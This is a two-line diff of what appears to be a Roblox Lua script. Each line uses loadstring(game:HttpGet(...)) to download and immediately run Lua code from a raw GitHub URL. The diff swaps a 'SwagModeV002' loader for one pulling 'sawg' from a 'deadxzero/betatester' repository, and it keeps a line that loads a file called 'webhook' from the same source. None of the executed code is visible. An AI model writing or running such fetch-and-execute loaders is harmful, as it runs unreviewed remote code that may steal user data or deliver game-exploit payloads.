@@ -1,2 +1,2 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/deadxzero/betatester/main/webhook'))() 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))() 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/deadxzero/betatester/main/sawg'))() 
